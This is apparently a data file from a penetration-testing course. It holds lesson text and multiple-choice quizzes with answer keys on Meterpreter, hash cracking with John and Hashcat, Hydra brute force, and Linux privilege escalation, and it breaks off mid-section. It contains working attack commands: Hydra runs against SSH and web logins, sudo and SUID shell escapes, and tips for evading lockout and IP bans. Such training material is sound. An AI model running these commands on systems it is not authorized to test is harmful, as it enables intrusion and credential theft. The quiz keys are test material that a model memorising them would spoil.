            difficulty: 'beginner',
            explanation: 'hashdump extracts SAM database hashes, typically requiring SYSTEM-level privileges.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What is the purpose of msfvenom?',
            options: ['To scan for vulnerabilities', 'To generate payloads for delivery to targets', 'To encode existing exploits', 'To manage Meterpreter sessions'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'msfvenom generates payloads in various formats (EXE, ELF, PHP, etc.) for use in exploitation.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'How do you transfer a file from your attacker machine to a compromised Windows target in Meterpreter?',
            options: ['download /local/file.txt', 'transfer file.txt target', 'upload /local/file.txt C:\\\\Windows\\\\Temp\\\\file.txt', 'scp file.txt target'],
            correctAnswerIndex: 2,
            difficulty: 'intermediate',
            explanation: 'The upload command transfers files from the attacker machine to the target through the Meterpreter session.',
            certTags: ['OSCP']
          },
          {
            question: 'What does the check command do before running an exploit?',
            options: ['Verifies the target is online', 'Tests if the target appears vulnerable without exploiting', 'Checks your network connectivity', 'Validates the payload encoding'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'check probes the target to determine if the vulnerability exists without actually exploiting it.',
            certTags: ['OSCP']
          },
          {
            question: 'Which Meterpreter command starts capturing keystrokes on the target?',
            options: ['keylogger_start', 'keyscan_start', 'capture_keys', 'start_keyscan'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'keyscan_start initiates the keylogger module within Meterpreter.',
            certTags: ['OSCP']
          },
          {
            question: 'What flag in msfvenom specifies the output file format?',
            options: ['-o', '-f', '-p', '-e'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: '-f specifies the output format (exe, elf, raw, etc.), while -o specifies the output filename.',
            certTags: ['OSCP']
          },
          {
            question: 'How do you list all active Meterpreter sessions in msfconsole?',
            options: ['sessions -l', 'show sessions', 'list sessions', 'sessions --list'],
            correctAnswerIndex: 0,
            difficulty: 'beginner',
            explanation: 'sessions -l lists all active sessions with their IDs, types, and information.',
            certTags: ['OSCP']
          },
          {
            question: 'What is required before hashdump will work in Meterpreter?',
            options: ['Root access on the target', 'SYSTEM-level privileges', 'Domain administrator rights', 'Physical access to the machine'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'hashdump requires SYSTEM-level privileges to access the SAM database. You may need to escalate privileges first.',
            certTags: ['OSCP']
          },
          {
            question: 'What does the shell command do in Meterpreter?',
            options: ['Opens a new terminal on your machine', 'Drops into a standard Windows command shell', 'Opens a Python shell', 'Starts a PowerShell session'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'shell drops into a standard cmd.exe shell on the target, useful for running native Windows commands.',
            certTags: ['OSCP']
          },
          {
            question: 'Which msfvenom flag specifies the listening host IP?',
            options: ['-RHOST', '-LHOST', '-HOST', '-CONNECT'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'LHOST specifies the IP address the payload connects back to.',
            certTags: ['OSCP', 'CEH']
          }
        ]
      }
    ]
  },
  {
    id: 'week32',
    title: 'Password Cracking & Brute Force',
    durationText: 'Week 32',
    focus: 'Identify hash types, crack passwords with John and Hashcat, and perform brute-force attacks with Hydra.',
    output: 'Password cracking lab report with hash identification and cracking results.',
    topics: [
      {
        id: 'we32d01',
        title: 'Hash Cracking',
        description: 'Identify hash types and crack them using John the Ripper and Hashcat.',
        type: 'learn',
        duration: '2 hours',
        content: `:::objectives
- Identify hash types using hashid and hash-identifier
- Crack hashes with John the Ripper using wordlists and format flags
- Crack hashes with Hashcat using appropriate mode numbers
- Apply rule-based attacks to improve cracking success
:::

:::info
All techniques in this topic are for local lab use only, never against systems you don't own or have explicit authorization to test.
:::

## Hash Identification

### Using hashid
\`\`\`bash
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
# Output: MD5, MD4, MD2, etc.
\`\`\`

### Using hash-identifier
\`\`\`bash
hash-identifier
# Paste the hash when prompted
\`\`\`

:::tip
Hash length is a quick indicator: 32 chars = MD5, 40 chars = SHA1, 64 chars = SHA256, 32 chars ( NTLM).
:::

## John the Ripper

### Basic Usage
\`\`\`bash
# Crack MD5 hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Specify hash format
john --format=raw-md5 hash.txt
john --format=raw-sha1 hash.txt
john --format=nt hash.txt  # Windows NTLM

# Show cracked passwords
john --show hash.txt
\`\`\`

### Common John Formats
| Format        | Use Case                    |
|--------------|----------------------------|
| \`raw-md5\`    | Plain MD5                   |
| \`raw-sha1\`   | Plain SHA1                  |
| \`raw-sha256\` | Plain SHA256                |
| \`nt\`         | Windows NTLM               |
| \`bcrypt\`     | bcrypt hashes               |
| \`sha512crypt\`| Linux SHA-512 /etc/shadow   |

### Useful John Commands
\`\`\`bash
# Identify hash type automatically
john --list=formats | grep -i md5

# Crack with rules
john --wordlist=rockyou.txt --rules hash.txt

# Show all cracked passwords from a session
john --show --format=nt hash.txt
\`\`\`

## Hashcat

### Basic Usage
\`\`\`bash
# Crack MD5 (mode 0)
hashcat -m 0 hash.txt rockyou.txt

# Crack SHA1 (mode 100)
hashcat -m 100 hash.txt rockyou.txt

# Crack NTLM (mode 1000)
hashcat -m 1000 hash.txt rockyou.txt

# Show results
hashcat -m 0 hash.txt rockyou.txt --show
\`\`\`

### Common Hashcat Mode Numbers
| Mode  | Hash Type                |
|------|--------------------------|
| 0    | MD5                      |
| 100  | SHA1                     |
| 1400 | SHA256                   |
| 1000 | NTLM                     |
| 3200 | bcrypt                   |
| 1800 | SHA-512 (Unix)           |
| 7500 | Kerberos 5 AS-REQ Pre-Auth |

### Rule-Based Attacks
\`\`\`bash
# Apply transformation rules to wordlist
hashcat -m 0 hash.txt rockyou.txt -r rules/best64.rule
hashcat -m 0 hash.txt rockyou.txt -r rules/toggles1.rule

# Combine multiple rule files
hashcat -m 0 hash.txt rockyou.txt -r rules/best64.rule -r rules/d3ad0ne.rule
\`\`\`

:::concept
Rule-based attacks modify each word in the wordlist (appending numbers, capitalizing, leetspeak substitutions) to catch passwords that are variations of dictionary words.
:::

### Hashcat Attack Modes
| Flag | Mode         | Description                              |
|-----|-------------|------------------------------------------|
| -a 0 | Dictionary  | Straight wordlist attack                 |
| -a 3 | Brute-force | Try all combinations of a charset        |
| -a 6 | Hybrid Word+Mask | Word + appended/appended characters |
| -a 7 | Hybrid Mask+Word | Characters prepended to word        |

\`\`\`bash
# Brute-force 8-character lowercase
hashcat -m 0 hash.txt -a 3 -i ?l?l?l?l?l?l?l?l

# Hybrid: word + 4 digits
hashcat -m 0 hash.txt -a 6 rockyou.txt ?d?d?d?d
\`\`\`

:::checkpoint
Crack a set of sample MD5 and NTLM hashes using both John and Hashcat. Compare the speed and output of each tool.
:::
`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'How do you identify an unknown hash type, and what is the difference between John the Ripper and Hashcat for cracking?',
        interviewAnswer: 'Use hashid or hash-identifier to identify hash type based on length and format, and consider the context like the source system. John the Ripper is CPU-focused with automatic format detection, while Hashcat leverages GPU acceleration for significantly faster cracking. Hashcat requires specifying mode numbers like 0 for MD5 or 1000 for NTLM. Both support rule-based attacks to modify wordlist entries for better coverage.',
        quiz: [
          {
            question: 'How many characters does a standard MD5 hash have?',
            options: ['40', '64', '32', '128'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: 'MD5 produces a 128-bit hash, which is represented as 32 hexadecimal characters.',
            certTags: ['CEH', 'CompTIA Security+']
          },
          {
            question: 'Which John the Ripper flag specifies the hash format?',
            options: ['--type', '--format', '--hash-type', '--mode'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'The --format flag tells John what hash type to use for cracking.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What is the Hashcat mode number for NTLM hashes?',
            options: ['0', '100', '1000', '3200'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: 'Mode 1000 is used for Windows NTLM hash cracking in Hashcat.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What does rule-based cracking do in Hashcat?',
            options: ['Tries every possible character combination', 'Applies transformations to wordlist entries to create password variations', 'Only cracks hashes with known rules', 'Uses predefined password patterns only'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Rules modify each word (capitalization, numbers, leetspeak) to catch password variations.',
            certTags: ['OSCP']
          },
          {
            question: 'Which tool is better for automatic hash type identification?',
            options: ['hashcat', 'hashid or hash-identifier', 'john --show', 'nmap'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'hashid and hash-identifier are specialized tools for identifying unknown hash types.',
            certTags: ['CEH']
          },
          {
            question: 'What does the --show flag do in John the Ripper?',
            options: ['Displays the current cracking session', 'Shows previously cracked passwords from a session file', 'Shows all format options', 'Displays the wordlist being used'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: '--show reads the john.pot file and displays all passwords cracked in previous sessions.',
            certTags: ['OSCP']
          },
          {
            question: 'What is the Hashcat attack mode flag -a 3 used for?',
            options: ['Dictionary attack', 'Brute-force mask attack', 'Hybrid attack', 'Rule-based attack'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Mode -a 3 performs a mask-based brute-force attack using character set placeholders like ?l, ?u, ?d, ?s.',
            certTags: ['OSCP']
          },
          {
            question: 'Which placeholder in Hashcat represents lowercase letters?',
            options: ['?u', '?l', '?d', '?s'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: '?l represents lowercase letters (a-z), ?u is uppercase, ?d is digits, and ?s is special characters.',
            certTags: ['OSCP']
          },
          {
            question: 'What is a practical way to determine if a hash is NTLM vs MD5?',
            options: ['They always look the same - you cannot tell', 'Check context: NTLM is 32 hex chars from Windows systems, MD5 is 32 hex chars from Linux/web apps', 'NTLM is always longer than MD5', 'MD5 always starts with a specific character'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Both are 32 hex characters. Context (target OS, source of hash) and tools like hashid help distinguish them.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What does the John command john --format=nt hash.txt do?',
            options: ['Cracks SHA256 hashes', 'Cracks Windows NTLM hashes', 'Cracks Linux shadow hashes', 'Identifies hash types only'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'The nt format in John is specifically for Windows NTLM password hashes.',
            certTags: ['OSCP']
          },
          {
            question: 'Which Hashcat command cracks SHA256 hashes from a file?',
            options: ['hashcat -m 0 hash.txt rockyou.txt', 'hashcat -m 100 hash.txt rockyou.txt', 'hashcat -m 1400 hash.txt rockyou.txt', 'hashcat -m 1000 hash.txt rockyou.txt'],
            correctAnswerIndex: 2,
            difficulty: 'intermediate',
            explanation: 'Mode 1400 is for SHA-256 hashes.',
            certTags: ['OSCP']
          },
          {
            question: 'What is the hybrid attack mode in Hashcat?',
            options: ['Combines dictionary with brute-force by appending or prepending characters to words', 'Uses two wordlists simultaneously', 'Combines two different hash types', 'Alternates between dictionary and rule attacks'],
            correctAnswerIndex: 0,
            difficulty: 'intermediate',
            explanation: 'Hybrid modes (a 6 and a 7) combine a wordlist word with a mask, either appending or prepending characters.',
            certTags: ['OSCP']
          },
          {
            question: 'Why is Hashcat often faster than John the Ripper?',
            options: ['Hashcat uses better wordlists', 'Hashcat leverages GPU acceleration while John primarily uses CPU', 'John has fewer format options', 'Hashcat supports more operating systems'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Hashcat is designed to leverage GPU parallel processing, making it significantly faster for most hash types.',
            certTags: ['CEH']
          },
          {
            question: 'What John command lists all supported hash formats?',
            options: ['john --list=formats', 'john --formats', 'john --help formats', 'john --show-formats'],
            correctAnswerIndex: 0,
            difficulty: 'beginner',
            explanation: 'john --list=formats displays all hash types that John the Ripper can crack.',
            certTags: ['OSCP']
          }
        ]
      },
      {
        id: 'we32d02',
        title: 'Brute Force Attacks',
        description: 'Use Hydra for brute-force attacks against common services in a controlled lab.',
        type: 'practice',
        duration: '2 hours',
        content: `:::objectives
- Understand the different types of password attacks
- Perform brute-force attacks against HTTP, SSH, and FTP with Hydra
- Select appropriate wordlists and understand rate limiting countermeasures
:::

:::warning
All brute-force techniques in this topic are for local lab use only, never against systems you don't own or have explicit authorization to test. Brute-forcing unauthorized systems is illegal.
:::

## What Is a Brute Force Attack?

A brute force attack tries every possible password until one works. But "brute force" is actually a category with several subtypes:

| Attack Type | How It Works | Speed | Example |
|-------------|-------------|-------|---------|
| **Dictionary** | Tries passwords from a wordlist | Fast | rockyou.txt, SecLists |
| **Brute Force** | Tries every character combination | Slow | aaaa, aaab, aaac... |
| **Hybrid** | Combines dictionary + rules | Medium | password1, password!, Password1 |
| **Credential Stuffing** | Uses leaked username:password pairs | Fast | Data breach dumps |

**Why dictionary attacks are most common:** A 8-character password has 218 trillion possible combinations. Even at 1 billion guesses/second, that's 69 years. A dictionary attack tries the 14 million most common passwords first - and usually finds one in minutes.

## Online vs Offline Attacks

This is the most important concept in password cracking:

**Online attacks** (what Hydra does):
- Try passwords against a LIVE service (SSH, HTTP, FTP)
- Speed limited by network latency and service response time
- Subject to account lockout, rate limiting, IP banning
- Speed: ~100-1000 guesses/second
- Use when: You have network access to the target service

**Offline attacks** (what Hashcat/John do):
- Crack password HASHES you've already obtained
- No network required - all computation is local
- No lockout - try as fast as your hardware allows
- Speed: ~10 billion guesses/second (GPU)
- Use when: You've dumped a database, stolen /etc/shadow, or captured a hash

**The key difference:** Online attacks are slow and detectable. Offline attacks are fast and silent. Always prefer offline when possible - get the hash first, crack it later.

## Why Protocol Choice Matters

Different services have different authentication mechanisms. This affects how you attack them:

| Protocol | Authentication | Lockout Risk | Speed |
|----------|---------------|-------------|-------|
| SSH | Username + password | Medium | ~50/sec |
| HTTP POST | Form-based | High (often has CAPTCHA) | ~100/sec |
| FTP | Username + password | Low | ~100/sec |
| SMB | Username + password + domain | Medium | ~50/sec |
| MySQL | Username + password | Low | ~100/sec |
| RDP | Username + password + NLA | High (often has lockout) | ~20/sec |

**What this means:** SSH brute force is slow but reliable. HTTP brute force is fast but often blocked. FTP is easy but less common. Choose your target based on what's available and what defenses exist.

## Tool: Hydra

Hydra is the standard online brute-force tool. It supports 50+ protocols and is optimized for speed.

**Basic syntax:**

\`\`\`bash
hydra -l <username> -P <password_list> <target> <service>
\`\`\`

| Flag | Description |
|------|-------------|
| \`-l\` | Single username |
| \`-L\` | Username list file |
| \`-p\` | Single password |
| \`-P\` | Password list file |
| \`-t\` | Parallel tasks (default 16) |
| \`-f\` | Stop after first valid credentials |
| \`-v\` | Verbose output |
| \`-V\` | Show each attempt |
| \`-s\` | Custom port number |

## Attack: SSH Brute Force

SSH is the most common target for brute force - it's exposed on most servers and rarely has CAPTCHA.

\`\`\`bash
# Single username, password list
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh

# Username list, password list
hydra -L users.txt -P passwords.txt 192.168.1.100 ssh

# Custom port, stop after first find
hydra -l admin -P wordlist.txt -f -s 2222 192.168.1.100 ssh
\`\`\`

**What happens:** Hydra opens multiple SSH connections in parallel, tries each password, and reports when one succeeds.

## Attack: HTTP Login Form Brute Force

Web login forms are common targets. The syntax is more complex because you need to tell Hydra what to POST and how to detect failure.

\`\`\`bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
\`\`\`

**Breaking down the http-post-form syntax:**

\`\`\`
"/login:username=^USER^&password=^PASS^:F=incorrect"
\`\`\`

| Part | Meaning |
|------|---------|
| \`/login\` | The URL path to POST to |
| \`username=^USER^\` | POST parameter - \`^USER^\` replaced by username |
| \`password=^PASS^\` | POST parameter - \`^PASS^\` replaced by password |
| \`F=incorrect\` | Failure string - response containing this means login failed |

**Why F= matters:** Hydra needs to know what a FAILED login looks like. If the response contains "incorrect", it's a failure. If it doesn't, the login succeeded.

**With cookies (for session-based auth):**

\`\`\`bash
hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:H=Cookie: session=abc123:F=Login Failed"
\`\`\`

## Attack: FTP Brute Force

FTP is straightforward - no complex syntax needed.

\`\`\`bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ftp
\`\`\`

## Attack: Other Services

\`\`\`bash
# SMB (Windows file sharing)
hydra -l administrator -P passwords.txt 192.168.1.100 smb

# MySQL database
hydra -l root -P passwords.txt 192.168.1.100 mysql

# RDP (Remote Desktop)
hydra -l administrator -P passwords.txt 192.168.1.100 rdp
\`\`\`

## Wordlists - Your Ammunition

The quality of your wordlist determines your success. Don't just use rockyou.txt for everything.

| Wordlist | Location (Kali) | Size | When to Use |
|----------|-----------------|------|-------------|
| fasttrack.txt | /usr/share/wordlists/ | 22K | Quick scan, common passwords |
| rockyou.txt | /usr/share/wordlists/ | 14M | Standard attack |
| SecLists | /usr/share/seclists/ | Various | Targeted attacks |
| Custom | You create it | Varies | When you know the target |

**Wordlist strategy:**
1. Start with fasttrack.txt (22K passwords, tests the most common ones)
2. If that fails, try rockyou.txt (14M passwords, covers most common)
3. If that fails, try SecLists (targeted by service, country, etc.)
4. If that fails, create a custom wordlist based on target info

:::tip
For initial brute-force, start with fasttrack.txt (small, common passwords). If that fails, move to rockyou.txt (larger, comprehensive). Never start with the biggest wordlist - it wastes time.
:::

## Defenses - What You'll Encounter

Understanding defenses helps you plan your attack:

**Account lockout:** After N failed attempts, the account is locked. Countermeasure: use \`-t 1\` (one attempt at a time) or switch to a different username.

**Rate limiting:** The service delays responses after failed attempts. Countermeasure: reduce parallel tasks (\`-t 4\`) or add delays between attempts.

**IP banning:** The service blocks your IP after N failed attempts. Countermeasure: rotate proxies or use a slow attack.

**CAPTCHA:** Requires human interaction. Countermeasure: no automated bypass - move to a different vector.

**Fail2ban:** Monitors logs and bans IPs with too many failed attempts. Countermeasure: check \`/var/log/fail2ban.log\` for ban duration.

:::warning
Many systems implement account lockout after failed attempts. Always check your target's lockout policy before brute-forcing. In a real engagement, coordinate with the client. Getting locked out during a pentest is embarrassing.
:::

**Reducing detection:**
- Reduce parallel tasks: \`-t 4\` (slower but less likely to trigger lockout)
- Use targeted wordlists instead of massive ones
- Monitor for lockout indicators in output
- Space out attacks over time

:::checkpoint
Set up a local SSH server and brute-force it with Hydra using rockyou.txt. Time the attack and note the speed. What happens if you reduce -t to 2? What happens if the server has Fail2ban installed?
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'What is the difference between online and offline password attacks, and how do you reduce detection risk during online brute force?',
        interviewAnswer: 'Online attacks try passwords against live services, limited by network latency and lockout policies, running at about 100 to 1000 guesses per second. Offline attacks crack obtained hashes locally with no lockout, reaching billions of guesses per second on GPUs. To reduce detection, lower parallel tasks with -t, use targeted wordlists, monitor for lockout indicators, and space attempts over time.',
        quiz: [
          {
            question: 'What does the ^USER^ placeholder do in Hydra http-post-form?',
            options: ['Specifies the target username', 'Replaced with the username from -l or -L flag', 'Sets the POST parameter name for the username', 'Acts as a regex pattern'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: '^USER^ is replaced with each username from the -l (single) or -L (list) flag during the attack.',
            certTags: ['CEH', 'OSCP']
          },
          {
            question: 'What is the correct Hydra syntax for brute-forcing SSH on a custom port?',
            options: ['hydra -l root -P wordlist.txt -s 2222 target ssh', 'hydra -l root -P wordlist.txt target ssh 2222', 'hydra -l root -P wordlist.txt --port 2222 ssh target', 'hydra -l root -P wordlist.txt target:2222 ssh'],
            correctAnswerIndex: 0,
            difficulty: 'beginner',
            explanation: 'The -s flag specifies the custom port number in Hydra.',
            certTags: ['OSCP']
          },
          {
            question: 'What does the F= parameter in Hydra http-post-form specify?',
            options: ['The form action URL', 'The string that indicates a failed login attempt', 'The file to save results to', 'The number of failed attempts before stopping'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'F= tells Hydra what string to look for in the response that indicates the login failed.',
            certTags: ['CEH', 'OSCP']
          },
          {
            question: 'What does the -f flag do in Hydra?',
            options: ['Forces the attack to continue after errors', 'Stops the attack after first valid credentials are found', 'Enables fast mode', 'Uses fasttrack wordlist automatically'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: '-f tells Hydra to stop as soon as valid credentials are found, avoiding unnecessary additional attempts.',
            certTags: ['OSCP']
          },
          {
            question: 'Which wordlist should you start with for a quick initial brute-force attempt?',
            options: ['rockyou.txt', 'fasttrack.txt', 'SecLists/common.txt', 'all-passwords.txt'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'fasttrack.txt is a small wordlist (~22K entries) of the most common passwords, ideal for quick initial attempts.',
            certTags: ['OSCP']
          },
          {
            question: 'What does the -t flag control in Hydra?',
            options: ['Timeout in seconds', 'Number of parallel tasks', 'Total number of attempts', 'Target IP address'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: '-t sets the number of parallel connections Hydra uses. Lower values are less likely to trigger lockout.',
            certTags: ['OSCP']
          },
          {
            question: 'What is a risk of using high parallel task counts (-t 16) during brute-force?',
            options: ['Slower attack speed', 'Higher chance of triggering account lockout', 'Lower success rate', 'Reduced output verbosity'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'High parallel counts generate many simultaneous failed login attempts, which commonly triggers account lockout policies.',
            certTags: ['CEH']
          },
          {
            question: 'How do you specify a username list file in Hydra?',
            options: ['-u users.txt', '-L users.txt', '--user-list users.txt', '-U users.txt'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: '-L (capital L) specifies a file containing a list of usernames to try.',
            certTags: ['OSCP']
          },
          {
            question: 'What does the -V flag do in Hydra?',
            options: ['Verbose mode showing each login attempt', 'Version information', 'Verbose mode showing only successes', 'Verbose mode showing protocol details'],
            correctAnswerIndex: 0,
            difficulty: 'beginner',
            explanation: '-V (capital V) shows each individual login attempt, useful for monitoring progress.',
            certTags: ['OSCP']
          },
          {
            question: 'Which Hydra flag specifies a custom port number?',
            options: ['-p', '-P', '-s', '--port'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: '-s followed by the port number specifies a custom port for the service being attacked.',
            certTags: ['OSCP']
          },
          {
            question: 'In Hydra http-post-form, what does the format "path:post_data:failure_string" mean?',
            options: [
              'The path is the website URL, post_data is the HTTP method, failure_string is the error code',
              'The path is the form URL, post_data contains the login fields, failure_string is text indicating failed login',
              'The path is the file path, post_data is the payload, failure_string is the response header',
              'The path is the API endpoint, post_data is JSON, failure_string is the HTTP status'
            ],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Hydra needs the form path, the POST data with ^USER^ and ^PASS^ placeholders, and a string that appears when login fails.',
            certTags: ['CEH', 'OSCP']
          },
          {
            question: 'What is the difference between -l and -L in Hydra?',
            options: ['-l is for passwords, -L is for usernames', '-l specifies a single username, -L specifies a file of usernames', '-l is for login, -L is for logout', '-l is lowercase, -L is uppercase - same function'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: '-l takes a single username string, while -L takes a file path containing multiple usernames.',
            certTags: ['OSCP']
          },
          {
            question: 'Which Hydra command brute-forces a MySQL database?',
            options: ['hydra -l root -P passwords.txt target mysql', 'hydra -l admin -P passwords.txt target mssql', 'hydra -l root -P passwords.txt target 3306', 'hydra -l dbadmin -P passwords.txt target mariadb'],
            correctAnswerIndex: 0,
            difficulty: 'beginner',
            explanation: 'MySQL is the service name used by Hydra, typically running on port 3306.',
            certTags: ['CEH']
          },
          {
            question: 'How can you reduce the risk of triggering account lockout during brute-force?',
            options: ['Use more parallel tasks', 'Use -t 2 to reduce parallel connections', 'Use faster wordlists', 'Disable verbose output'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Lowering -t reduces the number of simultaneous login attempts, making lockout less likely.',
            certTags: ['CEH']
          }
        ]
      }
    ]
  },
  {
    id: 'week33',
    title: 'Privilege Escalation',
    durationText: 'Week 33',
    focus: 'Identify and exploit privilege escalation vectors on both Linux and Windows systems.',
    output: 'Privilege escalation exercise demonstrating escalation from user to root/SYSTEM.',
    topics: [
      {
        id: 'we33d01',
        title: 'Linux Privilege Escalation',
        description: 'Enumerate and exploit Linux privilege escalation vectors including SUID, sudo misconfigs, and cron jobs.',
        type: 'learn',
        duration: '2 hours',
        content: `:::objectives
- Understand how Linux permissions and privilege levels work
- Identify SUID binaries, sudo misconfigs, cron jobs, and kernel exploits
- Use automated tools like LinPEAS for comprehensive enumeration
:::

:::info
All techniques in this topic are for local lab use only, never against systems you don't own or have explicit authorization to test.
:::

## How Linux Permissions Work

Every process on Linux runs with a **UID** (User ID) and **GID** (Group ID). When you type a command, the process inherits YOUR UID. The kernel checks permissions based on three levels:

- **Owner (u):** The user who owns the file
- **Group (g):** Users in the file's group
- **Others (o):** Everyone else

Each level has three permissions:
- **Read (r):** View file contents or list directory
- **Write (w):** Modify file or create/delete files in directory
- **Execute (x):** Run file as a program or enter directory

When you run \`ls -la\`, you see this:

\`\`\`bash
-rwxr-xr-x 1 root root 8840 Jul  7 10:00 script.sh
\`\`\`

Breaking it down:
| Position | Permission | Meaning |
|----------|-----------|---------|
| \`-\` | File type | Regular file |
| \`rwx\` | Owner | root can read, write, execute |
| \`r-x\` | Group | Group members can read and execute |
| \`r-x\` | Others | Everyone else can read and execute |

The **SUID bit** changes this: when set, the process runs with the FILE OWNER's UID, not yours. This is how \`passwd\` works - it's owned by root with SUID set, so it can modify \`/etc/shadow\` even when you run it as a regular user.

## The Privilege Escalation Mindset

Privilege escalation is not about running random commands and hoping something works. It follows a methodology:

1. **Enumerate** - Gather system information (OS, kernel, users, services)
2. **Identify** - Find misconfigurations, vulnerable software, writable files
3. **Evaluate** - Determine which finding is actually exploitable
4. **Exploit** - Use the vulnerability to gain higher privileges
5. **Verify** - Confirm you have root/SYSTEM access

The most common escalation vectors on Linux are:
- **SUID binaries** - Binaries that run as root
- **Sudo misconfigurations** - Commands you can run as root without a password
- **Cron jobs** - Scheduled tasks running as root that you can modify
- **Writable files** - Files owned by root that you can edit
- **Kernel exploits** - Vulnerabilities in the Linux kernel itself
- **Capabilities** - Fine-grained permissions on binaries
- **Docker group** - If you're in the docker group, you can mount the host filesystem

## Step 1: Enumeration - Know Your Target

Before you can escalate, you need to know what you're working with. Run these commands first:

\`\`\`bash
# Who are you and what groups do you belong to?
id
# Output: uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)

# What OS and kernel version?
uname -a
# Output: Linux server01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux

# What distribution?
cat /etc/os-release
# Output: Ubuntu 22.04.3 LTS

# What's the hostname?
hostname
# Output: webserver01

# Who else is on the system?
cat /etc/passwd | grep -v nologin | grep -v false
# Output: Shows users with shell access

# What can you run as root?
sudo -l
# Output: (user) NOPASSWD: /usr/bin/vim
\`\`\`

:::tip
Always check \`sudo -l\` first. If you can run ANY command as root without a password, you've already won.
:::

## Step 2: SUID Binaries - The #1 Vector

SUID binaries run with the file owner's privileges. If a binary is owned by root AND has SUID set, it runs as root. The dangerous ones are binaries that can:
- Execute arbitrary commands (find, vim, nmap, python)
- Read arbitrary files (cat, less, more)
- Write arbitrary files (tee, cp)

**Find all SUID binaries:**

\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
\`\`\`

This searches every file on the system for the SUID bit (permission 4000). Most results are legitimate (passwd, sudo, ping). You're looking for unusual ones.

**What to look for:**
- Custom scripts (often misconfigured)
- Binaries with known CVEs
- Binaries listed on GTFOBins

**Exploiting SUID find:**
If \`find\` has SUID and is owned by root, you can execute arbitrary commands as root:

\`\`\`bash
find . -exec /bin/sh -p \; -quit
\`\`\`

Why this works: \`find\`'s \`-exec\` flag runs any command. Since \`find\` is running as root (SUID), the shell it spawns also runs as root. The \`-p\` flag preserves the elevated privileges.

**Exploiting SUID vim:**

\`\`\`bash
vim -c ':!/bin/sh'
\`\`\`

Why this works: vim can execute shell commands with \`:!\`. Since vim is running as root, the shell it spawns is also root.

:::tip
Visit GTFOBins (https://gtfobins.github.io/) to look up exploitation methods for any SUID binary you find. Search for the binary name, click "SUID", and follow the instructions.
:::

## Step 3: Sudo Misconfigurations - Instant Root

If \`sudo -l\` shows you can run a command as root without a password (NOPASSWD), check GTFOBins for that binary. Common exploitable entries:

| Command | Exploitation Method |
|---------|-------------------|
| \`sudo vim\` | \`:!/bin/sh\` or \`:!/bin/bash\` |
| \`sudo find\` | \`find . -exec /bin/sh \;\` |
| \`sudo python\` | \`python -c 'import os; os.execl("/bin/sh","sh","-p")'\` |
| \`sudo nmap\` | \`!sh\` in interactive mode (\`nmap --interactive\`) |
| \`sudo less\` | \`:!/bin/sh\` |
| \`sudo awk\` | \`awk 'BEGIN {system("/bin/sh")}'\` |
| \`sudo perl\` | \`perl -e 'exec "/bin/sh";'\` |
| \`sudo ruby\` | \`ruby -e 'exec "/bin/sh"'\` |

**Why this works:** sudo runs the command as root. If the command can execute arbitrary commands (vim's \`:!\`, find's \`-exec\`, python's \`os.system\`), you get a root shell.

## Step 4: Cron Jobs - Scheduled Root Commands

Cron jobs run on a schedule. If a cron job runs as root and executes a script you can write to, you can modify the script to execute your commands.

**Find cron jobs:**

\`\`\`bash
# Your own cron jobs
crontab -l

# System-wide cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
\`\`\`

**Check if you can write to cron scripts:**

\`\`\`bash
ls -la /etc/cron.d/
# Look for scripts owned by your user or world-writable
\`\`\`

**Exploitation:** If you find a writable script that runs as root, modify it:

\`\`\`bash
